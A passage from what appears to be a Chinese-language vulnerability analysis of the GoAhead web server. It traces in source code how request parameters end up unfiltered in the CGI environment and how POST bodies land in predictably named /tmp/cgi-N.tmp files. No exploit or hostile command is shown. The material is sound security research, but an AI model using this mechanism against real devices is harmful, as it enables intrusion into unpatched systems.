</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        wp-&gt;flags |= WEBS_VARS_ADDED;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(*route-&gt;handler-&gt;service)(wp);
</span><span style="color:#c0c5ce;">}
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;">    NOTE: the vars variable is modified
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">addFormVars</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">vars</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char  </span><span style="color:#c0c5ce;">*keyword, *value, *prior, *tok;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(vars);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    keyword = </span><span style="color:#8fa1b3;">stok</span><span style="color:#c0c5ce;">(vars, &quot;</span><span style="color:#a3be8c;">&amp;</span><span style="color:#c0c5ce;">&quot;, &amp;tok);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(keyword != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((value = </span><span style="color:#96b5b4;">strchr</span><span style="color:#c0c5ce;">(keyword, &#39;</span><span style="color:#a3be8c;">=</span><span style="color:#c0c5ce;">&#39;)) != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            *value++ = &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">websDecodeUrl</span><span style="color:#c0c5ce;">(keyword, keyword, </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(keyword));
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">websDecodeUrl</span><span style="color:#c0c5ce;">(value, value, </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(value));
</span><span style="color:#c0c5ce;">        } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">            value = &quot;&quot;;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(*keyword) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">                If keyword has already been set, append the new value to what has been stored.
</span><span style="color:#65737e;">             */
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((prior = </span><span style="color:#8fa1b3;">websGetVar</span><span style="color:#c0c5ce;">(wp, keyword, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">websSetVarFmt</span><span style="color:#c0c5ce;">(wp, keyword, &quot;</span><span style="color:#d08770;">%s %s</span><span style="color:#c0c5ce;">&quot;, prior, value);
</span><span style="color:#c0c5ce;">            } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">websSetVar</span><span style="color:#c0c5ce;">(wp, keyword, value);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        keyword = </span><span style="color:#8fa1b3;">stok</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">&amp;</span><span style="color:#c0c5ce;">&quot;, &amp;tok);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>这里同样不管走<code>websSetVarFmt()</code>还是<code>websSetVar</code>，最终调用<code>hashEnter(wp-&gt;vars, var, v, 0);</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">PUBLIC </span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">websSetVar</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">var</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    WebsValue   v;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">websValid</span><span style="color:#c0c5ce;">(wp));
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(var &amp;&amp; *var);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(value) {
</span><span style="color:#c0c5ce;">        v = </span><span style="color:#8fa1b3;">valueString</span><span style="color:#c0c5ce;">(value, VALUE_ALLOCATE);
</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">        v = </span><span style="color:#8fa1b3;">valueString</span><span style="color:#c0c5ce;">(&quot;&quot;, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">hashEnter</span><span style="color:#c0c5ce;">(wp-&gt;vars, var, v, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>hashEnter()</code>中同样分类，用<code>hashlist</code>管理变量
通过计算出来的<code>hindex</code>沿着哈希表遍历，如果for结束出来时的<code>sp</code>不为空，说明变量重名了，此时认为之前的资源未释放，将资源释放后再覆盖；
如果<code>sp</code>为空，申请内存设置变量后链入
如果哈希表对应节点为空，说明这条链还没有头节点，则申请头节点填入，再申请空间设置变量后链入
设置变量使用<code>sp-&gt;name = valueString(name, VALUE_ALLOCATE);</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;">    Enter a symbol into the table. If already there, update its value.  Always succeeds if memory available. We allocate
</span><span style="color:#65737e;">    a copy of &quot;name&quot; here so it can be a volatile variable. The value &quot;v&quot; is just a copy of the passed in value, so it
</span><span style="color:#65737e;">    MUST be persistent.
</span><span style="color:#65737e;"> */
</span><span style="color:#c0c5ce;">WebsKey *</span><span style="color:#8fa1b3;">hashEnter</span><span style="color:#c0c5ce;">(WebsHash </span><span style="color:#bf616a;">sd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">name</span><span style="color:#c0c5ce;">, WebsValue </span><span style="color:#bf616a;">v</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    HashTable   *tp;
</span><span style="color:#c0c5ce;">    WebsKey     *sp, *last;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char        </span><span style="color:#c0c5ce;">*cp;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">         hindex;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(name);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&lt;= sd &amp;&amp; sd &lt; symMax);
</span><span style="color:#c0c5ce;">    tp = sym[sd];
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(tp);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">        Calculate the first daisy-chain from the hash table. If non-zero, then we have daisy-chain, so scan it and look
</span><span style="color:#65737e;">        for the symbol.
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    last = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    hindex = </span><span style="color:#8fa1b3;">hashIndex</span><span style="color:#c0c5ce;">(tp, name);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((sp = tp-&gt;hash_table[hindex]) != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(; sp; sp = sp-&gt;forw) {
</span><span style="color:#c0c5ce;">            cp = sp-&gt;name.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(cp[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] == name[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] &amp;&amp; </span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(cp, name) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            last = sp;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(sp) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">                Found, so update the value If the caller stores handles which require freeing, they will be lost here.
</span><span style="color:#65737e;">                It is the callers responsibility to free resources before overwriting existing contents. We will here
</span><span style="color:#65737e;">                free allocated strings which occur due to value_instring().  We should consider providing the cleanup
</span><span style="color:#65737e;">                function on the open rather than the close and then we could call it here and solve the problem.
</span><span style="color:#65737e;">             */
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(sp-&gt;content.</span><span style="color:#bf616a;">valid</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">valueFree</span><span style="color:#c0c5ce;">(&amp;sp-&gt;content);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            sp-&gt;content = v;
</span><span style="color:#c0c5ce;">            sp-&gt;arg = arg;
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> sp;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">            Not found so allocate and append to the daisy-chain
</span><span style="color:#65737e;">         */
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((sp = (WebsKey*) </span><span style="color:#8fa1b3;">walloc</span><span style="color:#c0c5ce;">(sizeof(WebsKey))) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        sp-&gt;name = </span><span style="color:#8fa1b3;">valueString</span><span style="color:#c0c5ce;">(name, VALUE_ALLOCATE);
</span><span style="color:#c0c5ce;">        sp-&gt;content = v;
</span><span style="color:#c0c5ce;">        sp-&gt;forw = (WebsKey*) </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        sp-&gt;arg = arg;
</span><span style="color:#c0c5ce;">        sp-&gt;bucket = hindex;
</span><span style="color:#c0c5ce;">        last-&gt;forw = sp;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">            Daisy chain is empty so we need to start the chain
</span><span style="color:#65737e;">         */
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((sp = (WebsKey*) </span><span style="color:#8fa1b3;">walloc</span><span style="color:#c0c5ce;">(sizeof(WebsKey))) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        tp-&gt;hash_table[hindex] = sp;
</span><span style="color:#c0c5ce;">        tp-&gt;hash_table[</span><span style="color:#8fa1b3;">hashIndex</span><span style="color:#c0c5ce;">(tp, name)] = sp;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        sp-&gt;forw = (WebsKey*) </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        sp-&gt;content = v;
</span><span style="color:#c0c5ce;">        sp-&gt;arg = arg;
</span><span style="color:#c0c5ce;">        sp-&gt;name = </span><span style="color:#8fa1b3;">valueString</span><span style="color:#c0c5ce;">(name, VALUE_ALLOCATE);
</span><span style="color:#c0c5ce;">        sp-&gt;bucket = hindex;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> sp;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>这里就是最终设置一个请求变量的地方 <code>v.value.string = value;</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">WebsValue </span><span style="color:#8fa1b3;">valueString</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    WebsValue v;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;v, </span><span style="color:#d08770;">0x0</span><span style="color:#c0c5ce;">, sizeof(v));
</span><span style="color:#c0c5ce;">    v.</span><span style="color:#bf616a;">valid </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    v.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= string;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(flags &amp; VALUE_ALLOCATE) {
</span><span style="color:#c0c5ce;">        v.</span><span style="color:#bf616a;">allocated </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        v.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">sclone</span><span style="color:#c0c5ce;">(value);
</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">        v.</span><span style="color:#bf616a;">allocated </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        v.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string </span><span style="color:#c0c5ce;">= value;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> v;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>回看设置环境变量处，正是从哈希表中取出<code>s-&gt;name.value.string</code>并存储于<code>envp</code>环境变量中</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">// src/cgi.c:cgiHandler
</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(n = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, s = </span><span style="color:#8fa1b3;">hashFirst</span><span style="color:#c0c5ce;">(wp-&gt;vars); s != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">; s = </span><span style="color:#8fa1b3;">hashNext</span><span style="color:#c0c5ce;">(wp-&gt;vars, s)) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(s-&gt;content.</span><span style="color:#bf616a;">valid </span><span style="color:#c0c5ce;">&amp;&amp; s-&gt;content.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">== string &amp;&amp;
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(s-&gt;name.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">REMOTE_HOST</span><span style="color:#c0c5ce;">&quot;) != </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&amp;&amp;
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(s-&gt;name.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">HTTP_AUTHORIZATION</span><span style="color:#c0c5ce;">&quot;) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            envp[n++] = </span><span style="color:#8fa1b3;">sfmt</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">=</span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, s-&gt;name.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">, s-&gt;content.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">trace</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">Env[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">] </span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, n, envp[n-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(n &gt;= envpsize) {
</span><span style="color:#c0c5ce;">                envpsize *= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                envp = </span><span style="color:#8fa1b3;">wrealloc</span><span style="color:#c0c5ce;">(envp, envpsize * sizeof(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*));
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span></pre>
<p>猜测本意是通过这种方式把参数传给cgi之类的，但是忽略了可以直接劫持系统环境变量</p>
<p>下面再分析下报文的body部分如何处理
在前文提过的<code>parseIncoming()</code>函数中，<code>POST</code>方法中<code>wp-&gt;cgiStdin</code>被赋值为一个``</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">smatch</span><span style="color:#c0c5ce;">(wp-&gt;method, &quot;</span><span style="color:#a3be8c;">POST</span><span style="color:#c0c5ce;">&quot;)) {
</span><span style="color:#c0c5ce;">            wp-&gt;cgiStdin = </span><span style="color:#8fa1b3;">websGetCgiCommName</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((wp-&gt;cgifd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(wp-&gt;cgiStdin, O_CREAT | O_WRONLY | O_BINARY | O_TRUNC, </span><span style="color:#d08770;">0666</span><span style="color:#c0c5ce;">)) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">websError</span><span style="color:#c0c5ce;">(wp, HTTP_CODE_NOT_FOUND | WEBS_CLOSE, &quot;</span><span style="color:#a3be8c;">Cannot open CGI file</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;">    Returns a pointer to an allocated qualified unique temporary file name. This filename must eventually be deleted with
</span><span style="color:#65737e;">    wfree().
</span><span style="color:#65737e;"> */
</span><span style="color:#c0c5ce;">PUBLIC </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">websGetCgiCommName</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">websTempFile</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">cgi</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>这里文件名生成是有规律的，每次count++</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">PUBLIC </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">websTempFile</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">dir</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">prefix</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">static int</span><span style="color:#c0c5ce;"> count = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">   sep;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    sep = &#39;</span><span style="color:#a3be8c;">/</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!dir || *dir == &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;) {
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> WINCE
</span><span style="color:#c0c5ce;">        dir = &quot;</span><span style="color:#a3be8c;">/Temp</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">        sep = &#39;</span><span style="color:#96b5b4;">\\</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#b48ead;">#elif</span><span style="color:#c0c5ce;"> ME_WIN_LIKE
</span><span style="color:#c0c5ce;">        dir = </span><span style="color:#96b5b4;">getenv</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">TEMP</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        sep = &#39;</span><span style="color:#96b5b4;">\\</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#b48ead;">#elif</span><span style="color:#c0c5ce;"> VXWORKS
</span><span style="color:#c0c5ce;">        dir = &quot;</span><span style="color:#a3be8c;">.</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#b48ead;">#else
</span><span style="color:#c0c5ce;">        dir = &quot;</span><span style="color:#a3be8c;">/tmp</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!prefix) {
</span><span style="color:#c0c5ce;">        prefix = &quot;</span><span style="color:#a3be8c;">tmp</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">sfmt</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%s%c%s</span><span style="color:#a3be8c;">-</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">.tmp</span><span style="color:#c0c5ce;">&quot;, dir, sep, prefix, count++);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>状态<code>WEBS_CONTENT</code>时调用的<code>processContent()</code>函数根据不同上传类型调用不同处理函数
<code>POST</code>方法会走到<code>websProcessCgiData()</code>，其中将body内容写入前面打开的临时文件中</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">PUBLIC </span><span style="color:#b48ead;">bool </span><span style="color:#8fa1b3;">websProcessCgiData</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    ssize   nbytes;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    nbytes = </span><span style="color:#8fa1b3;">bufLen</span><span style="color:#c0c5ce;">(&amp;wp-&gt;input);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">trace</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">cgi: write </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> bytes to CGI program</span><span style="color:#c0c5ce;">&quot;, nbytes);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(wp-&gt;cgifd, wp-&gt;input.</span><span style="color:#bf616a;">servp</span><span style="color:#c0c5ce;">, (</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">) nbytes) != nbytes) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">websError</span><span style="color:#c0c5ce;">(wp, HTTP_CODE_INTERNAL_SERVER_ERROR| WEBS_CLOSE, &quot;</span><span style="color:#a3be8c;">Cannot write to CGI gateway</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">trace</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">cgi: write </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> bytes to CGI program</span><span style="color:#c0c5ce;">&quot;, nbytes);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">websConsumeInput</span><span style="color:#c0c5ce;">(wp, nbytes);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>查看创建的临时文件</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ayoung@ay:~/goahead$ ls /tmp/cgi-*
</span><span style="color:#c0c5ce;">/tmp/cgi-0.tmp  /tmp/cgi-2.tmp  /tmp/cgi-4.tmp
</span><span style="color:#c0c5ce;">ayoung@ay:~/goahead$ cat /tmp/cgi-0.tmp 
</span><span style="color:#c0c5ce;">B=22222222
</span></pre>
<p>启动cgi前会判断如果前面没有赋值<code>wp-&gt;cgiStdin</code>这里也会赋为一个临时文件名，并且如果之前打开过文件这里会关闭fd</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;">        Create temporary file name(s) for the child&#39;s stdin and stdout. For POST data the stdin temp file (and name)
</span><span style="color:#65737e;">        should already exist.
</span><span style="color:#65737e;">     */
